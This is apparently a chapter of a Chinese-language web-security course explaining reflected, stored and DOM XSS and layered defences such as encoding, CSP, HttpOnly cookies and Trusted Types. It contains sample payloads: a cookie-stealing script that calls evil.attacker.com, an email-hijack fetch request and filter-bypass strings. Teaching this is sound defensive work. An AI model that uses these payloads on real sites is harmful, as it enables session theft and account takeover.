# 第 09 章:跨站腳本 XSS(Cross-Site Scripting)與 CSP 防禦

> 上一章(第 08 章)講的注入家族,payload 最終是注進「伺服器」——注進 SQL 引擎、注進作業系統、注進模板引擎。
> 這一章的 XSS 換了個舞台:payload 注進的是「**別人的瀏覽器**」。攻擊者寫的 JavaScript,不是在他自己電腦跑,
> 而是在**受害者的瀏覽器、以受害者的登入身分**執行。這一字之差,危害卻天差地遠:偷 session、冒充身分發請求、
> 側錄鍵盤、把整頁換成釣魚表單……都在受害者渾然不覺下發生。XSS 蟬聯 OWASP Top 10 多年不是沒道理。
> 這一章我們先看清三種 XSS 的資料流差別,實際打一遍,再把防禦寫得跟攻擊一樣詳盡——特別是給前端工程師的那一段。

---

## 9.1 XSS 是什麼、為什麼危險

**跨站腳本(Cross-Site Scripting,縮寫刻意寫成 XSS 以免跟 CSS 搞混)** 的定義很簡單:

> **攻擊者設法讓「他寫的 JavaScript」被送進網頁,並在其他使用者的瀏覽器裡執行。**

聽起來好像沒什麼——「不就是跑一段 JS 嗎?」關鍵在**「在誰的瀏覽器、用誰的身分」**。回想第 00 章的信任邊界:瀏覽器對「從這個網站來的程式碼」是**完全信任**的。它能讀寫這個網站的 Cookie、能存取頁面上所有內容、能用你的登入狀態發任何請求。瀏覽器的同源政策(Same-Origin Policy)本來是要把不同網站隔開,但 XSS 的可怕之處是:**攻擊者的程式碼是「掛在受害網站名下」執行的**,所以同源政策不但擋不住它,反而替它背書——瀏覽器認定「這是 bank.com 自己的腳本」,於是給它 bank.com 的全部權限。

> **心智模型**:XSS = 讓別人的瀏覽器替攻擊者打工。你以為在跟銀行網站互動,實際上頁面裡混進了一段攻擊者的 JS,它頂著「銀行網站」的名義,用「你」的登入身分,在背地裡替攻擊者做事。

### 本質:這是一種「注入到瀏覽器」的攻擊

XSS 和第 07、08 章的 SQLi、命令注入,骨子裡是**同一種病**:

```
所有注入漏洞的共同公式:
  「不可信的資料」 + 「被當成程式碼解讀的地方」 = 注入
```

- SQL 注入:使用者輸入被當成 **SQL 語法**解讀。
- 命令注入:使用者輸入被當成 **shell 指令**解讀。
- **XSS**:使用者輸入被當成 **HTML / JavaScript** 解讀。

差別只在「注進哪個直譯器」。SQLi 注進資料庫、命令注入注進作業系統,**XSS 注進的是瀏覽器的 HTML 剖析器與 JS 引擎**。理解這一點很重要,因為它意味著:XSS 的根治之道和其他注入一樣——**把資料放進正確的上下文、做正確的編碼,別讓資料有機會「變成程式碼」**(9.8 會展開)。

### 為什麼開發者一直踩雷

因為「把使用者的資料顯示在網頁上」是**每個網站都在做的事**:留言、暱稱、搜尋關鍵字、商品名稱、錯誤訊息……只要有任何一個地方,把使用者給的字串**原封不動塞進 HTML**,而那字串裡剛好有 `<script>`,災難就發生了。攻擊面大到防不勝防,這是 XSS 長年高居漏洞榜的根本原因。

---

## 9.2 XSS 三型:資料流決定一切

XSS 依「payload 怎麼跑到受害者瀏覽器」分成三型。**別死背名字,要看資料流**——資料流才是三者的真正差異,也決定了你該怎麼防、怎麼測。

| 面向 | 反射型 Reflected | 儲存型 Stored | DOM 型 DOM-based |
|------|-----------------|---------------|------------------|
| **payload 存在哪** | 在請求裡(URL 參數、表單) | 存進伺服器資料庫 | 完全不進伺服器,只在前端 |
| **資料流** | 瀏覽器送出 → 伺服器**即時反射**回頁面 | 攻擊者存入 → 之後**每個訪客**讀取頁面時取出 | 前端 JS 讀取來源(如網址)→ 自己寫進 DOM |
| **誰會中招** | 點了惡意連結的**單一受害者** | **所有看到該內容的人** | 存取被構造網址的受害者 |
| **要怎麼遞送** | 釣魚連結、惡意網址(誘騙點擊) | 攻擊者只要貼一次,之後自動散播 | 釣魚連結(含惡意 hash/query) |
| **後端看得到 payload 嗎** | 看得到(在請求裡) | 看得到(存進 DB) | **通常看不到**(如 `#` 後的內容不會送到伺服器) |
| **危險程度** | 中(需誘騙) | **最高**(自動、大規模、可蠕蟲化) | 中~高(後端 WAF 難偵測) |

三型的資料流用圖看更清楚:

```
【反射型】
受害者點惡意連結 → 帶著 payload 的請求送到伺服器
  → 伺服器把 payload 原樣「反射」寫回回應頁面 → 受害者瀏覽器執行

【儲存型】
攻擊者送一次 payload → 存進資料庫(留言、暱稱…)
  → 之後「每一個」訪客開這頁 → 伺服器從 DB 取出 payload 寫進頁面 → 全部中招

【DOM 型】
payload 在網址(常在 # 之後,根本不送到伺服器)
  → 前端 JS 自己讀 location.hash → 用 innerHTML 寫進頁面 → 執行
  → 伺服器全程沒參與,後端日誌可能什麼都沒記到
```

> **關鍵區分**:反射型和儲存型的漏洞在**後端**(後端把資料寫進 HTML 沒編碼);DOM 型的漏洞在**前端 JS**(前端把資料寫進 DOM 沒處理)。這個區分決定了「該檢查哪一層的程式碼」,後面各節分別實作。

---

## 9.3 反射型 XSS 實戰:一個會中招的搜尋頁

> **提醒**:以下所有 payload 與操作,只在你自己搭建的靶場(第 01 章)或官方授權平台進行。對沒有授權的網站測試 XSS,即使只是彈個 alert,在台灣一樣可能觸犯《刑法》妨害電腦使用罪(第 00 章)。

幾乎每個網站都有搜尋功能,而搜尋頁最愛做一件事:把你搜的關鍵字回顯出來,「您搜尋的是:XXX」。看看這個(有漏洞的)後端:

```php
<?php
// search.php —— 一個典型的、會中招的搜尋頁
$q = $_GET['q'];                          // ① 直接拿 URL 的 q 參數(不可信輸入!)
echo "<h2>您搜尋的關鍵字是:" . $q . "</h2>";  // ② 原封不動接進 HTML 就輸出
?>
```

正常使用時,訪問 `search.php?q=手機`,頁面顯示「您搜尋的關鍵字是:手機」,一切正常。開發者測完覺得沒問題就上線了。

問題出在**第 ② 行**:它把 `$q` 當成「純文字」串進 HTML,但瀏覽器可不這麼想——瀏覽器收到的是一串 HTML,它會**認真剖析裡面的每個標籤**。攻擊者這樣構造網址:

```
search.php?q=<script>alert(1)</script>
```

伺服器產生的回應變成:

```html
<h2>您搜尋的關鍵字是:<script>alert(1)</script></h2>
```

瀏覽器剖析到 `<script>` 標籤,不會把它當文字顯示,而是**當成一段要執行的腳本**。於是 `alert(1)` 執行,彈出對話框。`alert(1)` 本身無害,它只是 XSS 測試的「探針」——**能彈窗,就證明我塞的 JS 能執行,那我塞什麼它都能執行**(9.6 會換成真正有殺傷力的 payload)。

### 實際攻擊怎麼進行

新手常有的誤區是:「我要在自己網址列打 `<script>` 才會中,那不就是自己攻擊自己?有什麼用?」——真正的攻擊是**誘騙別人點你構造好的連結**:

```
① 攻擊者構造惡意網址(通常會做 URL 編碼、用短網址包裝掩飾):
   https://target.com/search.php?q=<script>...竊取cookie的程式碼...</script>

② 透過釣魚遞送(第 18 章):
   - 假冒官方寄 email:「您的帳號有異常登入,請點此確認」
   - 社群訊息、留言區貼連結、廣告

③ 受害者點了連結 → 瀏覽器打開的是「真的 target.com」
   (網址列真的是 target.com,憑證也是真的!)
   → 但頁面裡混進了攻擊者的 JS → 在受害者的登入狀態下執行
```

反射型的關鍵特徵:**payload 藏在連結裡,不誘騙點擊就不會中**。所以它需要社交工程配合,危害範圍是「點了的那些人」。這也是它比儲存型「溫和」的原因——但別小看,一封精心設計的釣魚信可以打中成千上萬人。

---

## 9.4 儲存型 XSS 實戰:一次投毒,全體中招

儲存型是三型裡**最危險**的。差別只有一個字:payload 不是反射回去,而是**存進資料庫**,之後每個讀到它的人都中招。

想像一個留言板:

```php
<?php
// 存留言(有漏洞版本)
$comment = $_POST['comment'];
db_query("INSERT INTO comments (body) VALUES ('$comment')");  // ① 攻擊者的 payload 進了 DB

// ------- 別人瀏覽留言頁時 -------
$rows = db_query("SELECT body FROM comments");
foreach ($rows as $row) {
    echo "<div class='comment'>" . $row['body'] . "</div>";   // ② 從 DB 取出直接輸出
}
?>
```

攻擊者只要在留言框送出一次:

```html
<script>
  // 把當前使用者的 cookie 傳到攻擊者的伺服器
  new Image().src = "https://evil.attacker.com/steal?c=" + document.cookie;
</script>
```

逐行看這個 payload 的機制:

- `new Image()`:建立一個圖片物件。用圖片是因為它**不受同源政策限制**——瀏覽器允許網頁載入任何來源的圖片。
- `.src = "https://evil.attacker.com/steal?c=" + document.cookie`:一旦設定 `src`,瀏覽器**立刻對這個網址發出 GET 請求**去「載入圖片」,而網址後面就夾帶了 `document.cookie`(受害者的 cookie)。
- 攻擊者的伺服器根本不用回傳真圖片,只要把收到的 `?c=...` 記到日誌就行。受害者只看到「一張破圖」甚至什麼都沒看到,cookie 已經送出去了。

### 為什麼威力最大

這段 payload **存進了留言表**。之後發生的事很恐怖:

```
攻擊者貼一次惡意留言 → 存進 DB
  ↓
使用者 A 開留言頁 → 中招,cookie 被偷
使用者 B 開留言頁 → 中招
管理員開後台審留言 → 中招!(管理員權限的 cookie 被偷 → 攻擊者接管後台)
...每一個開這頁的人都自動中招,不需要點任何連結
```

三個致命特性讓儲存型封王:

1. **自動散播、規模大**:不需要誘騙點擊,受害者「正常使用網站」就中。訪問量越大,受害者越多。
2. **常打到高權限帳號**:留言、回報、履歷這類「使用者產生內容」很常被**管理員**在後台檢視——一旦管理員中招,等於直接淪陷。
3. **可蠕蟲化(worm)**:如果 payload 本身會「以受害者身分再發一則含 payload 的留言/貼文」,它就會**指數擴散**。史上著名的 MySpace「Samy 蠕蟲」在 20 小時內感染超過一百萬個帳號,靠的就是儲存型 XSS(9.6 詳述)。

> **心智模型**:反射型像「寄一封毒信給特定人」,要一個一個騙;儲存型像「在公共水源裡下毒」,只要投一次,所有來喝水的人全部中標。這就是為什麼滲透測試遇到儲存型 XSS,風險評級通常直接拉到高危。

---

## 9.5 DOM 型 XSS:漏洞在前端 JS,後端全程沒參與

前兩型的漏洞都在後端(伺服器把資料寫進 HTML 時沒處理)。**DOM 型完全不一樣:後端可能寫得好好的,漏洞出在前端 JavaScript**。

現代網站大量用 JS 動態操作頁面。如果前端 JS 把「不可信的來源」直接寫進「會執行的地方」,就會 XSS。看這個常見寫法——一個「歡迎頁」想讀網址裡的名字來打招呼:

```html
<div id="welcome"></div>
<script>
  // ① location.hash = 網址 # 後面那一段,例如 #張三 → hash 是 "#張三"
  //    這是「使用者可控」的不可信來源
  const name = decodeURIComponent(location.hash.substring(1)); // 去掉開頭的 #

  // ② 用 innerHTML 把它寫進頁面 —— 這裡就是災難
  document.getElementById("welcome").innerHTML = "歡迎," + name + "!";
</script>
```

正常訪問 `page.html#張三`,顯示「歡迎,張三!」。但攻擊者構造:

```
page.html#<img src=x onerror=alert(1)>
```

第 ② 行的 `innerHTML` 會把這串**當成 HTML 剖析**。瀏覽器建立一個 `<img>`,去載入 `src=x`(一個不存在的圖),載入失敗觸發 `onerror`,於是 `alert(1)` 執行。(為什麼不用 `<script>`?因為透過 `innerHTML` 插入的 `<script>` 標籤**不會被執行**,這是 HTML 規範,所以 DOM 型幾乎都用 `onerror`/`onload` 這類事件——見 9.7。)

### Source → Sink:DOM XSS 的核心概念

DOM XSS 的分析框架是「資料從哪來(source)、流到哪去(sink)」:

```
Source(不可信來源)        →→→ 資料流 →→→        Sink(危險的執行點)
─────────────────────                          ─────────────────────
location.hash / .search              element.innerHTML = ...
location.href                        element.outerHTML = ...
document.referrer                    document.write(...)
window.name                          eval(...)  /  setTimeout("字串")
postMessage 收到的資料               location = ...(可被 javascript: 利用)
localStorage 的內容                  jQuery 的 $(...).html(...)
```

> **心智模型**:DOM XSS = 「**污水(source)流進了排水口(sink)**」。防禦就是:要嘛在中間裝濾網(對資料編碼/淨化),要嘛換一個不會執行程式碼的排水口(用 `textContent` 取代 `innerHTML`)。

### 為什麼 DOM 型特別難防、難測

- **payload 可能不經過伺服器**:`#` 後面的 hash **瀏覽器不會送給伺服器**。所以伺服器日誌、WAF(網頁防火牆)**根本看不到 payload**,傳統的後端偵測手段全失效。
- **漏洞藏在一堆 JS 裡**:要靠讀前端程式碼、追 source→sink 的資料流才找得到,不像反射型看回應就知道。
- **框架也可能中**:雖然 React/Vue 預設安全(9.8),但只要開發者用了 `innerHTML`、`dangerouslySetInnerHTML`、`v-html` 這類「繞過框架保護」的 API,DOM XSS 立刻回來。

---

## 9.6 XSS 能造成什麼危害:遠不只彈窗

新手看到 XSS 教學總是彈 `alert(1)`,容易誤以為「XSS 就是彈個窗,能怎樣?」。`alert(1)` 只是**證明「我能在你頁面跑任意 JS」**——而「能跑任意 JS」等於「能做這個網頁使用者能做的一切」。列舉威力:

**① 竊取 Cookie / Session Token(最經典)**
如同 9.4,`document.cookie` 送到攻擊者伺服器。拿到 session token,攻擊者直接**冒充受害者登入**,不用密碼(詳見第 11 章 Session 攻防)。這也是為什麼 `HttpOnly` cookie 很重要(9.8)。

**② 以受害者身分發請求**
攻擊者的 JS 可以用 `fetch`/`XMLHttpRequest`,**帶著受害者的登入 cookie**,對網站發任何請求:改 email、改密碼、轉帳、把攻擊者設為管理員。因為請求來自受害者自己的瀏覽器、自己的 session,伺服器完全分不出真假。

```js
// XSS 內執行:把受害者的帳號 email 改成攻擊者的(之後就能用「忘記密碼」接管)
fetch('/api/account', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',                       // 帶上受害者的 cookie
  body: JSON.stringify({ email: 'attacker@evil.com' })
});
```

**③ 鍵盤側錄(keylogging)**
掛一個 `keydown` 監聽器,把受害者在頁面上的每一次打字(包含在登入框、信用卡欄輸入的內容)即時回傳。

**④ 頁面釣魚(內容竄改)**
用 JS 把整頁改掉,蓋上一個假的登入表單。因為網址列**真的是官方網址、憑證也真**,受害者毫無戒心地把帳密送給攻擊者。

**⑤ 掛載攻擊框架(BeEF 概念)**
BeEF(Browser Exploitation Framework)是一套「XSS 後利用」工具:XSS 一旦得手,就把受害瀏覽器「勾住(hook)」,攻擊者能從控制台即時對它下指令——探測內網、發社交工程彈窗、嘗試進一步攻擊。它把「一個 alert」升級成「一個被遠端操控的瀏覽器」。

**⑥ XSS 蠕蟲(self-propagating)**
儲存型 XSS + 「以受害者身分再貼一則帶 payload 的內容」= 自我複製。前面提到的 MySpace Samy 蠕蟲,payload 會自動把攻擊者加為好友、並把自己複製到受害者的個人頁,於是**看的人越多、傳染越多**,20 小時破百萬。

**⑦ 串接 CSRF(第 10 章)**
XSS 能直接在同源內發請求,所以它可以**繞過大多數 CSRF 防禦**(連同源檢查、甚至讀取頁面上的 CSRF token 一起打包)。這是漏洞鏈的典型:XSS 讓 CSRF 從「難利用」變「輕鬆得手」。

> **心智模型**:不要問「XSS 能做什麼」,要問「**這個網頁的合法使用者能做什麼**」——答案就是 XSS 能做的全部。使用者能轉帳,XSS 就能轉帳;管理員能刪庫,打中管理員的 XSS 就能刪庫。

---

## 9.7 繞過過濾:為什麼「黑名單」防不住 XSS

很多開發者第一直覺是:「那我把 `<script>` 過濾掉不就好了?」——這是**黑名單思維**,而黑名單在 XSS 面前幾乎必敗。因為「讓瀏覽器執行 JS」的方式**多到數不完**,你封得完 `<script>`,封不完所有路。看攻擊者的武器庫:

### 一、不用 `<script>` 也能執行 JS

HTML 有大量能觸發 JS 的「事件處理器」,完全不需要 `<script>` 標籤:

```html
<img src=x onerror=alert(1)>          <!-- 圖載入失敗 → 觸發 onerror -->
<svg onload=alert(1)>                  <!-- SVG 載入完成 → 觸發 onload -->
<body onload=alert(1)>                 <!-- 頁面載入 → 觸發 -->
<input autofocus onfocus=alert(1)>     <!-- 自動取得焦點 → 觸發 onfocus -->
<a href="javascript:alert(1)">點我</a> <!-- javascript: 偽協定 -->
<iframe src="javascript:alert(1)">     <!-- 同上 -->
<details open ontoggle=alert(1)>       <!-- 冷門標籤也有事件 -->
```

光是 `on*` 開頭的事件處理器就有數十個,你的黑名單不可能列全。`<img onerror>` 和 `<svg onload>` 是實戰最常用的兩個——短、可靠、不依賴 `<script>`。

### 二、大小寫與變形繞過

如果過濾器只比對小寫的 `<script>`:

```html
<ScRiPt>alert(1)</ScRiPt>              <!-- 大小寫混寫,HTML 標籤不分大小寫照樣執行 -->
<scr<script>ipt>alert(1)</scr</script>ipt>  <!-- 「巢狀」:過濾器把中間的 <script> 刪掉,
                                             剩下的頭尾拼回來又變成完整 <script> -->
```

第二種尤其陰險:一個「刪掉 `<script>` 就好」的過濾器,反而**幫攻擊者把 payload 拼成完整的**。

### 三、編碼繞過

同一段 payload 可以用各種編碼混淆,騙過只看「字面字串」的過濾器:

```
HTML 實體編碼: &lt;img src=x onerror=alert(1)&gt;  (某些上下文瀏覽器會還原)
URL 編碼:      %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
十進位實體:    &#60;img src=x onerror=alert(1)&#62;
```

瀏覽器在剖析時會**自動解碼**,於是編碼後躲過過濾、解碼後變回可執行的 payload。

### 四、上下文決定 payload 長相(重點觀念)

同樣要注入,注入點在 HTML 的哪個位置,payload 完全不同。這也是 9.8「context-aware 編碼」的伏筆:

```html
<!-- 情境 A:注入點在標籤之間(HTML 內容上下文) -->
<div>【這裡】</div>
payload: <img src=x onerror=alert(1)>       ← 需要自己開一個標籤

<!-- 情境 B:注入點在屬性值裡面(HTML 屬性上下文) -->
<input value="【這裡】">
payload: "><img src=x onerror=alert(1)>     ← 先用 "> 跳出屬性和標籤,再開新標籤

<!-- 情境 C:注入點在 <script> 裡(JS 上下文) -->
<script> var name = "【這裡】"; </script>
payload: ";alert(1);//                       ← 用 "; 結束字串和敘述,再插入自己的程式碼
```

> **為什麼黑名單註定失敗**:攻擊者的變化空間(標籤 × 事件 × 大小寫 × 編碼 × 上下文)近乎無限,而黑名單是「列舉壞東西」——你永遠列不完。**正確思路是白名單/正向處理**:不去猜「哪些是壞的」,而是「**確定資料被放進哪個上下文,對那個上下文做完整的輸出編碼**」,讓資料無論長什麼樣都只能是「資料」,不會變成「程式碼」。這正是下一節的主軸。

---

## 9.8 【重點】防禦:把每個上下文都堵死

防禦要寫得跟攻擊一樣詳盡。XSS 防禦不是單一招,而是**縱深防禦**——多層獨立的保護疊起來,一層破了還有下一層。核心六招:

### ① Context-Aware 輸出編碼(根治核心)

這是 XSS 防禦的**根本**。原理呼應第 08 章:注入的成因是「資料被當成程式碼」,所以要在**資料進入頁面的那一刻,依它所在的上下文做正確編碼**,讓那些「有語法意義的字元」變成「純粹的顯示字元」。

最基本的 HTML 內容編碼,是把這幾個字元轉成 HTML 實體:

```
<  →  &lt;        >  →  &gt;
&  →  &amp;       "  →  &quot;
'  →  &#x27;
```

這樣一來,攻擊者送的 `<script>` 會變成 `&lt;script&gt;`——瀏覽器**照字面顯示出 `<script>` 這幾個字**,而不會把它當標籤執行。9.3 的搜尋頁只要改成:

```php
<?php
$q = $_GET['q'];
// htmlspecialchars 把 < > & " ' 轉成 HTML 實體,資料就只能是文字
echo "<h2>您搜尋的關鍵字是:" . htmlspecialchars($q, ENT_QUOTES, 'UTF-8') . "</h2>";
?>
```

**但關鍵是「context-aware」——不同上下文要用不同的編碼**,用錯一樣中招:

| 資料要放進的上下文 | 該用的編碼 | 若用錯會怎樣 |
|-------------------|-----------|-------------|
| HTML 內容(標籤之間) | HTML 實體編碼 | — |
| HTML 屬性值裡 | HTML 屬性編碼(且屬性務必加引號) | 沒加引號時,空白就能跳出屬性 |
| `<script>` 裡的 JS 字串 | JS 編碼(`\xHH` 之類) | HTML 編碼在 JS 裡無效,照樣被執行 |
| URL 參數裡 | URL 編碼 | 可被 `javascript:` 偽協定利用 |
| CSS 值裡 | CSS 編碼 | 老舊瀏覽器有 CSS expression 風險 |

> **新手誤區**:以為「做了 `htmlspecialchars` 就百毒不侵」。錯。如果資料是放進 `<script>var x="這裡"` 的 JS 字串裡,HTML 編碼**完全擋不住**——攻擊者用 `";alert(1);//` 一樣跳出。**編碼必須對應「資料最終落腳的那個上下文」**,這就是 context-aware 的意思。實務上別自己刻,用成熟函式庫(如 OWASP Java Encoder、各語言的內建編碼函式),或直接用會自動處理的現代框架(見第 ④ 點)。

### ② Content-Security-Policy(CSP):縱深防禦的第二道牆

CSP 是一個 HTTP 回應標頭,用來告訴瀏覽器「**這個頁面只准從哪些來源載入/執行資源**」。它的價值在於:**萬一你的編碼漏了一個洞,CSP 還能擋住 payload 真正發作**。

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
```

逐項拆解:

- `default-src 'self'`:所有資源預設只能來自「自己這個網域」。
- `script-src 'self'`:**腳本**只能來自本站的 `.js` 檔——這一條會**擋掉行內腳本(inline script)**,也就是 `<script>alert(1)</script>` 和 `onerror=alert(1)` 這類直接寫在 HTML 裡的 JS 全部失效!攻擊者就算成功注入了 `<script>`,瀏覽器也拒絕執行它。
- `object-src 'none'`:禁用 `<object>`/`<embed>`(老舊的 Flash 類攻擊面)。
- `base-uri 'self'`:防止攻擊者用 `<base>` 標籤改寫相對路徑的基準。

**為什麼 CSP 是「縱深防禦」而非「萬靈丹」**:

- 它是**第二道防線**,不是取代編碼。理想是「編碼把 XSS 擋在門外,CSP 在門後再補一刀」。只靠 CSP 不做編碼,是本末倒置。
- CSP **設錯等於沒設**。最常見的敗筆是加了 `'unsafe-inline'`(為了讓既有的行內腳本能跑)——這等於把「擋行內腳本」這個 CSP 最大的價值直接關掉,XSS 又能執行了。
- 現代推薦用 **nonce 或 hash** 來允許特定的行內腳本,而不是開 `'unsafe-inline'`:給每個合法的 `<script>` 一個一次性隨機值 `nonce`,瀏覽器只執行帶對 nonce 的腳本,攻擊者注入的腳本沒有正確 nonce 就跑不了。
- 它防不了「純資料竊取型」的部分攻擊,也對 DOM 改寫類的破壞有限。

> **心智模型**:編碼是「不讓壞人進門」,CSP 是「就算進了門,也不給他工具動手」。兩者都要有,這才叫縱深防禦(這正是第 00 章 Kill Chain「打斷任一環」思維在防禦端的體現)。

### ③ HttpOnly Cookie:讓 JS 偷不到 session

即使 XSS 得手,我們也能讓它「偷不到最值錢的東西」。在 session cookie 上加 `HttpOnly` 屬性:

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
```

- `HttpOnly`:**JavaScript 無法透過 `document.cookie` 讀到這個 cookie**。9.4 那段 `document.cookie` 偷 session 的攻擊,直接失效——JS 讀到的是空的。
- `Secure`:cookie 只在 HTTPS 傳送,避免明文竊聽。
- `SameSite`:限制跨站送出,順帶緩解 CSRF(第 10 章)。

要注意:`HttpOnly` 只是「降低危害」,**不是根治**——XSS 還是能「以受害者身分直接發請求」(9.6 的第 ② 點,fetch 會自動帶上 HttpOnly cookie,只是 JS 讀不到內容而已)。但它能擋掉最省事的「偷 token 冒登入」攻擊,是必做的一層。

### ④ 現代框架 React / Vue:預設就幫你擋掉多數 XSS(前端工程師必讀)

好消息:如果你用 React 或 Vue,**它們預設就對「嵌入的資料」做輸出編碼**,大多數 XSS 自然被擋掉。看 React:

```jsx
// React:大括號插值會「自動轉義」
function Welcome({ name }) {
  // 就算 name 是 "<img src=x onerror=alert(1)>",
  // React 也會把它當「純文字」渲染,顯示出這串字,不會執行
  return <h2>歡迎,{name}!</h2>;
}
```

Vue 同理:`{{ name }}` 這種模板插值一律自動轉義,`<script>` 進去只會被當文字顯示。**這是現代前端 XSS 大幅減少的主因**——框架把「context-aware 編碼」內建成預設行為了。

**但——什麼寫法會「破功」?** 就是你主動告訴框架「別轉義,把這串當 HTML 塞進去」的那些 API:

```jsx
// React:dangerouslySetInnerHTML —— 名字裡有 "dangerously" 是故意警告你!
function Article({ html }) {
  // 這裡 html 若含使用者可控內容,且沒淨化 → 直接 XSS
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

```vue
<!-- Vue:v-html 同樣繞過轉義,把字串當 HTML 渲染 -->
<div v-html="userContent"></div>   <!-- userContent 不可信 + 沒淨化 → XSS -->
```

**破功的三個典型場景**,前端工程師特別容易踩:

1. **用 `dangerouslySetInnerHTML` / `v-html` 渲染使用者內容**(如富文本留言、markdown)卻沒淨化。→ 必須先過 **DOMPurify** 這類淨化函式庫,把危險標籤/屬性清掉再渲染。
2. **把使用者資料放進 `href`**:`<a href={userUrl}>`——如果 `userUrl` 是 `javascript:alert(1)`,React 的插值轉義**擋不住偽協定**(它只轉義文字,不驗證 URL 協定)。要自己檢查 URL 是不是 `http/https` 開頭。
3. **繞過框架直接操作 DOM**:在 React 裡用 `ref` 拿到節點再 `node.innerHTML = ...`,或用了會 `innerHTML` 的第三方套件——等於繞過框架保護,DOM XSS(9.5)回歸。

> **給前端工程師的一句話**:框架幫你擋掉了「99% 你沒特別做什麼」的情況;剩下 1% 全在你**主動掀開安全網**的地方——看到 `dangerouslySetInnerHTML`、`v-html`、`innerHTML`、把資料塞進 `href`/`src`,就要亮紅燈,問自己「這資料可信嗎?淨化了嗎?」。

### ⑤ 輸入驗證(輔助,不是主力)

在資料進入時做**白名單驗證**:email 欄位就驗 email 格式、年齡就驗數字、下拉選項就驗是不是清單內的值。這能減少攻擊面,但**要認清它是輔助**——因為很多欄位(如留言、暱稱、文章)本來就允許各種字元,你無法靠輸入驗證擋掉。**真正根治 XSS 的是「輸出編碼」,不是「輸入過濾」**(輸入是為了資料品質,輸出編碼才是為了安全)。切記:XSS 是「輸出到頁面時」發生的問題,自然要在「輸出點」解決。

### ⑥ Trusted Types:從源頭封死 DOM XSS

Trusted Types 是較新的瀏覽器機制,專門對付 DOM 型 XSS(9.5)。它透過 CSP 開啟:

```
Content-Security-Policy: require-trusted-types-for 'script'
```

開啟後,那些危險的 sink(`innerHTML`、`document.write` 等)**不再接受普通字串**——你只能傳一個「經過受信任政策產生的 TrustedHTML 物件」給它們。等於強迫所有寫進 DOM 的內容都必須先過一個你定義的淨化關卡,**從源頭讓「把不可信字串直接塞進 innerHTML」變成不可能**。目前 Chromium 系支援較好,是防 DOM XSS 的進階武器。

**六招總覽(縱深防禦)**:

| 層 | 手段 | 定位 |
|----|------|------|
| 主力 | Context-aware 輸出編碼 / 現代框架自動轉義 | **根治**:讓資料無法變程式碼 |
| 補強 | CSP(nonce/hash,別用 unsafe-inline) | 第二道牆:注入了也難執行 |
| 減災 | HttpOnly / Secure / SameSite cookie | 降低得手後的危害 |
| 前端 | DOMPurify 淨化 + 慎用 v-html/dangerouslySetInnerHTML | 補框架被掀開的洞 |
| 進階 | Trusted Types | 從源頭封死 DOM XSS |
| 輔助 | 白名單輸入驗證 | 縮小攻擊面 |

---

## 9.9 靶場練習:在授權環境動手

> **再次強調**:以下練習**只在你自己搭的靶場或官方授權平台**進行(第 00、01 章)。DVWA 和 Juice Shop 都是「明確授權你攻擊」的教學環境,用它們練是合法的;把同樣手法用到別人的網站則是犯罪。

### DVWA(Damn Vulnerable Web Application)

DVWA 把 XSS 拆成三個對應模組,剛好練三型,而且能調難度(Low / Medium / High)看防禦怎麼被逐步加上:

| 模組 | 對應 | 練習重點 |
|------|------|---------|
| **XSS (Reflected)** | 9.3 反射型 | Low:直接送 `<script>alert(1)</script>`;調高難度後,練 9.7 的繞過(大小寫、`<img onerror>`) |
| **XSS (Stored)** | 9.4 儲存型 | 在留言/留言板存入 payload,重整頁面看它每次都執行;體會「一次投毒」 |
| **XSS (DOM)** | 9.5 DOM 型 | payload 放在網址參數,觀察前端 JS 如何把它寫進 DOM,練 source→sink 分析 |

**建議練法**:每個模組都從 Low 開始打通,然後**把難度調到 High、開 View Source 看它加了什麼防禦**(通常就是 9.8 的編碼函式)——這是「攻完想防」最直接的訓練(呼應第 00 章學習建議)。

### OWASP Juice Shop

Juice Shop 是現代化(Angular 前端 + Node 後端)的刻意漏洞靶場,更貼近真實 SPA,XSS 關卡也更接近實戰:

- **DOM XSS 關**:在搜尋框輸入 payload,體會前端框架情境下的 DOM 型 XSS(它甚至有針對 Angular 特性的題目)。
- **Bonus / Stored 關**:透過 API 把 payload 存進去,練「繞過前端、直接打後端」的思路(第 00 章「前端驗證無效」)。
- Juice Shop 內建計分板,解出來會記點,適合按部就班闖關。

搭建方式最簡單的是 Docker(可搭配本倉庫 Docker 課程):`docker run` 起一個容器就有靶場,打壞了砍掉重來,完全隔離、不影響外界(第 01 章)。

---

## 9.10 本章小結

- **XSS 的本質**是「注入到瀏覽器」——和 SQLi、命令注入(第 07、08 章)同一種病,只是注進的直譯器換成了 HTML 剖析器與 JS 引擎。攻擊者的 JS 在**受害者的瀏覽器、以受害者的身分**執行,同源政策不但擋不住還替它背書。
- **三型看資料流**:反射型(payload 在請求裡即時反射,需誘騙點擊)、儲存型(payload 進 DB,所有訪客中招,**最危險**、可蠕蟲化)、DOM 型(漏洞在前端 JS,payload 常不經過後端,難偵測)。
- **危害遠不只彈窗**:偷 session、以受害者身分發請求、鍵盤側錄、頁面釣魚、BeEF 勾瀏覽器、XSS 蠕蟲、串接 CSRF(第 10 章)。問「合法使用者能做什麼」就知道 XSS 能做什麼。
- **黑名單過濾必敗**:`<img onerror>`、`<svg onload>`、事件處理器、大小寫/編碼變形、不同上下文……攻擊者的變化空間近乎無限。
- **防禦是縱深的**:①context-aware 輸出編碼(**根治核心**,依上下文用對編碼)②CSP(第二道牆,別用 `unsafe-inline`,改用 nonce)③HttpOnly cookie(讓 JS 偷不到 session)④React/Vue 預設轉義擋掉多數 XSS,但 `dangerouslySetInnerHTML`/`v-html`/塞 `href` 會破功⑤白名單輸入驗證(輔助)⑥Trusted Types(封死 DOM XSS)。
- **前端工程師記住**:框架幫你擋了 99%,剩下的洞全在你「主動掀開安全網」的地方。

> **下一章預告**:XSS 是「讓受害者的瀏覽器替攻擊者跑 JS」;第 10 章要談的 **CSRF(跨站請求偽造)** 則反過來——**不需要跑你的 JS,只要騙你的瀏覽器「自動帶著登入 cookie」發出一個攻擊者指定的請求**,你甚至不知道自己按了什麼。我們還會看它的表親 **SSRF(伺服器端請求偽造)**:讓「伺服器」去打它本不該打的內網位址,一路摸到雲端 metadata、拿走金鑰(呼應第 00 章的漏洞鏈)。兩個「請求偽造」一起講,你會更清楚「信任邊界」被繞過的各種姿勢。

---

